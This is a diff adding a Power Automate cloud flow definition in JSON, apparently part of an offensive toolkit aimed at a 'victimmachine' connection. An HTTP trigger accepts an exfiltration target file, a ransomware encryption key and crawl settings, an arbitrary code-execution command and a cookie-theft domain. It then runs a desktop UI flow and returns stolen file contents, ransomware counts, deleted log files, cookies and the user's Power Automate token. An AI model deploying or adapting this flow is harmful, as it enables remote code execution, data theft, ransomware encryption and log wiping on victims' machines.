@@ -1,0 +1,513 @@
+{
+  "properties": {
+    "connectionReferences": {
+      "shared_uiflow_1": {
+        "runtimeSource": "embedded",
+        "connection": {
+          "connectionReferenceLogicalName": "pwntoso_victimmachine"
+        },
+        "api": {
+          "name": "shared_uiflow"
+        }
+      }
+    },
+    "definition": {
+      "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
+      "contentVersion": "1.0.0.0",
+      "parameters": {
+        "$connections": {
+          "defaultValue": {},
+          "type": "Object"
+        },
+        "$authentication": {
+          "defaultValue": {},
+          "type": "SecureObject"
+        }
+      },
+      "triggers": {
+        "manual": {
+          "metadata": {
+            "operationMetadataId": "56bdfe99-aa8d-4b4c-a1ba-77d3cb174604"
+          },
+          "type": "Request",
+          "kind": "Http",
+          "inputs": {
+            "schema": {
+              "type": "object",
+              "properties": {
+                "FlowToRun": {
+                  "type": "string"
+                },
+                "ExfilTargetFile": {
+                  "type": "string"
+                },
+                "RansomwareCrawlDepth": {
+                  "type": "string"
+                },
+                "RansomwareDirectoriesToInitCrawl": {
+                  "type": "string"
+                },
+                "RansomwareEncryptionKey": {
+                  "type": "string"
+                },
+                "CodeExecCommand": {
+                  "type": "string"
+                },
+                "CodeExecCommandType": {
+                  "type": "string"
+                },
+                "StealCookieFQDN": {
+                  "type": "string"
+                }
+              }
+            },
+            "method": "POST"
+          }
+        }
+      },
+      "actions": {
+        "Response_failed": {
+          "runAfter": {
+            "Try_unattended": [
+              "Failed",
+              "Skipped",
+              "TimedOut"
+            ]
+          },
+          "metadata": {
+            "operationMetadataId": "d6a4952c-ca1f-4648-8651-a7ae201a1112"
+          },
+          "type": "Response",
+          "kind": "Http",
+          "inputs": {
+            "statusCode": 200,
+            "body": {
+              "FlowSuccess": false,
+              "FlowType": "",
+              "StealPowerAutomateToken": {
+                "Token": ""
+              },
+              "FlowErrors": {
+                "AttendedRunError": "@body('Run_attended_RPA')",
+                "UnattendedRunError": "@body('Run_unattended_RPA')"
+              }
+            },
+            "schema": {
+              "type": "object",
+              "properties": {
+                "FlowSuccess": {
+                  "type": "boolean"
+                },
+                "FlowType": {
+                  "type": "string"
+                },
+                "FlowErrors": {
+                  "type": "object",
+                  "properties": {
+                    "AttendedRunError": {
+                      "type": "object",
+                      "properties": {}
+                    },
+                    "UnattendedRunError": {
+                      "type": "object",
+                      "properties": {}
+                    }
+                  }
+                },
+                "CodeExec": {
+                  "type": "object",
+                  "properties": {
+                    "ScriptOutput": {
+                      "type": "string"
+                    },
+                    "ScriptError": {
+                      "type": "string"
+                    }
+                  }
+                },
+                "Exfil": {
+                  "type": "object",
+                  "properties": {
+                    "Success": {
+                      "type": "boolean"
+                    },
+                    "FileContents": {
+                      "type": "string"
+                    }
+                  }
+                },
+                "Ransomware": {
+                  "type": "object",
+                  "properties": {
+                    "FilesFound": {
+                      "type": "integer"
+                    },
+                    "FilesAccessed": {
+                      "type": "integer"
+                    },
+                    "FilesProcessed": {
+                      "type": "integer"
+                    },
+                    "Errors": {
+                      "type": "string"
+                    }
+                  }
+                },
+                "Cleanup": {
+                  "type": "object",
+                  "properties": {
+                    "LogFilesFound": {
+                      "type": "integer"
+                    },
+                    "LogFilesDeleted": {
+                      "type": "integer"
+                    }
+                  }
+                },
+                "StealCookie": {
+                  "type": "object",
+                  "properties": {
+                    "Cookie": {
+                      "type": "string"
+                    }
+                  }
+                },
+                "StealPowerAutomateToken": {
+                  "type": "object",
+                  "properties": {
+                    "Token": {
+                      "type": "string"
+                    }
+                  }
+                }
+              }
+            }
+          }
+        },
+        "Try_unattended": {
+          "actions": {
+            "Run_unattended_RPA": {
+              "runAfter": {},
+              "metadata": {
+                "operationMetadataId": "17896653-d42e-4221-acfa-fd570583febe"
+              },
+              "type": "OpenApiConnection",
+              "inputs": {
+                "host": {
+                  "connectionName": "shared_uiflow_1",
+                  "operationId": "RunUIFlow_V2",
+                  "apiId": "/providers/Microsoft.PowerApps/apis/shared_uiflow"
+                },
+                "parameters": {
+                  "uiFlowId": "c4e7b7da-54e4-49ab-b634-fccd77c65025",
+                  "runMode": "unattended"
+                },
+                "authentication": "@parameters('$authentication')"
+              }
+            },
+            "Response_unattended": {
+              "runAfter": {
+                "Run_unattended_RPA": [
+                  "Succeeded"
+                ]
+              },
+              "metadata": {
+                "operationMetadataId": "790c2b17-952a-420f-b087-b6b2e2e80e62"
+              },
+              "type": "Response",
+              "kind": "Http",
+              "inputs": {
+                "statusCode": 200,
+                "body": {
+                  "FlowSuccess": true,
+                  "FlowType": "unattended",
+                  "StealPowerAutomateToken": {
+                    "Token": "@outputs('Run_unattended_RPA')?['body/Token']"
+                  },
+                  "FlowErrors": {
+                    "AttendedRunError": "@body('Run_attended_RPA')",
+                    "UnattendedRunError": {}
+                  }
+                },
+                "schema": {
+                  "type": "object",
+                  "properties": {
+                    "FlowSuccess": {
+                      "type": "boolean"
+                    },
+                    "FlowType": {
+                      "type": "string"
+                    },
+                    "FlowErrors": {
+                      "type": "object",
+                      "properties": {
+                        "AttendedRunError": {
+                          "type": "object",
+                          "properties": {}
+                        },
+                        "UnattendedRunError": {
+                          "type": "object",
+                          "properties": {}
+                        }
+                      }
+                    },
+                    "CodeExec": {
+                      "type": "object",
+                      "properties": {
+                        "ScriptOutput": {
+                          "type": "string"
+                        },
+                        "ScriptError": {
+                          "type": "string"
+                        }
+                      }
+                    },
+                    "Exfil": {
+                      "type": "object",
+                      "properties": {
+                        "Success": {
+                          "type": "boolean"
+                        },
+                        "FileContents": {
+                          "type": "string"
+                        }
+                      }
+                    },
+                    "Ransomware": {
+                      "type": "object",
+                      "properties": {
+                        "FilesFound": {
+                          "type": "integer"
+                        },
+                        "FilesAccessed": {
+                          "type": "integer"
+                        },
+                        "FilesProcessed": {
+                          "type": "integer"
+                        },
+                        "Errors": {
+                          "type": "string"
+                        }
+                      }
+                    },
+                    "Cleanup": {
+                      "type": "object",
+                      "properties": {
+                        "LogFilesFound": {
+                          "type": "integer"
+                        },
+                        "LogFilesDeleted": {
+                          "type": "integer"
+                        }
+                      }
+                    },
+                    "StealCookie": {
+                      "type": "object",
+                      "properties": {
+                        "Cookie": {
+                          "type": "string"
+                        }
+                      }
+                    },
+                    "StealPowerAutomateToken": {
+                      "type": "object",
+                      "properties": {
+                        "Token": {
+                          "type": "string"
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "Terminate_unattended": {
+              "runAfter": {
+                "Response_unattended": [
+                  "Succeeded"
+                ]
+              },
+              "metadata": {
+                "operationMetadataId": "6cc700d0-1886-4c85-8ff0-6db84031701e"
+              },
+              "type": "Terminate",
+              "inputs": {
+                "runStatus": "Succeeded"
+              }
+            }
+          },
+          "runAfter": {
+            "Try_attended": [
+              "Failed",
+              "TimedOut",
+              "Skipped"
+            ]
+          },
+          "metadata": {
+            "operationMetadataId": "6fbbd063-5c45-48f1-ae07-fe49d974cfe3"
+          },
+          "type": "Scope"
+        },
+        "Try_attended": {
+          "actions": {
+            "Run_attended_RPA": {
+              "runAfter": {},
+              "metadata": {
+                "operationMetadataId": "673c1ad1-bb83-4d42-bde7-82f0c83a9c2b"
+              },
+              "type": "OpenApiConnection",
+              "inputs": {
+                "host": {
+                  "connectionName": "shared_uiflow_1",
+                  "operationId": "RunUIFlow_V2",
+                  "apiId": "/providers/Microsoft.PowerApps/apis/shared_uiflow"
+                },
+                "parameters": {
+                  "uiFlowId": "c4e7b7da-54e4-49ab-b634-fccd77c65025",
+                  "runMode": "attended"
+                },
+                "authentication": "@parameters('$authentication')"
+              }
+            },
+            "Response_attended": {
+              "runAfter": {
+                "Run_attended_RPA": [
+                  "Succeeded"
+                ]
+              },
+              "metadata": {
+                "operationMetadataId": "458c7a10-f144-40d6-be4e-63fbe5c05607"
+              },
+              "type": "Response",
+              "kind": "Http",
+              "inputs": {
+                "statusCode": 200,
+                "body": {
+                  "FlowSuccess": true,
+                  "FlowType": "attended",
+                  "FlowErrors": {
+                    "AttendedRunError": {},
+                    "UnattendedRunError": {}
+                  },
+                  "StealPowerAutomateToken": {
+                    "Token": "@outputs('Run_attended_RPA')?['body/Token']"
+                  }
+                },
+                "schema": {
+                  "type": "object",
+                  "properties": {
+                    "FlowSuccess": {
+                      "type": "boolean"
+                    },
+                    "FlowType": {
+                      "type": "string"
+                    },
+                    "FlowErrors": {
+                      "type": "object",
+                      "properties": {
+                        "AttendedRunError": {
+                          "type": "object",
+                          "properties": {}
+                        },
+                        "UnattendedRunError": {
+                          "type": "object",
+                          "properties": {}
+                        }
+                      }
+                    },
+                    "CodeExec": {
+                      "type": "object",
+                      "properties": {
+                        "ScriptOutput": {
+                          "type": "string"
+                        },
+                        "ScriptError": {
+                          "type": "string"
+                        }
+                      }
+                    },
+                    "Exfil": {
+                      "type": "object",
+                      "properties": {
+                        "Success": {
+                          "type": "boolean"
+                        },
+                        "FileContents": {
+                          "type": "string"
+                        }
+                      }
+                    },
+                    "Ransomware": {
+                      "type": "object",
+                      "properties": {
+                        "FilesFound": {
+                          "type": "integer"
+                        },
+                        "FilesAccessed": {
+                          "type": "integer"
+                        },
+                        "FilesProcessed": {
+                          "type": "integer"
+                        },
+                        "Errors": {
+                          "type": "string"
+                        }
+                      }
+                    },
+                    "Cleanup": {
+                      "type": "object",
+                      "properties": {
+                        "LogFilesFound": {
+                          "type": "integer"
+                        },
+                        "LogFilesDeleted": {
+                          "type": "integer"
+                        }
+                      }
+                    },
+                    "StealCookie": {
+                      "type": "object",
+                      "properties": {
+                        "Cookie": {
+                          "type": "string"
+                        }
+                      }
+                    },
+                    "StealPowerAutomateToken": {
+                      "type": "object",
+                      "properties": {
+                        "Token": {
+                          "type": "string"
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "Terminate_attended": {
+              "runAfter": {
+                "Response_attended": [
+                  "Succeeded"
+                ]
+              },
+              "metadata": {
+                "operationMetadataId": "c938b1db-f75b-4ccb-b079-6f94e096e5d0"
+              },
+              "type": "Terminate",
+              "inputs": {
+                "runStatus": "Succeeded"
+              }
+            }
+          },
+          "runAfter": {},
+          "metadata": {
+            "operationMetadataId": "10071e1f-2baf-4e71-b550-17f86b993d54"
+          },
+          "type": "Scope"
+        }
+      }
+    }
+  },
+  "schemaVersion": "1.0.0.0"
+}
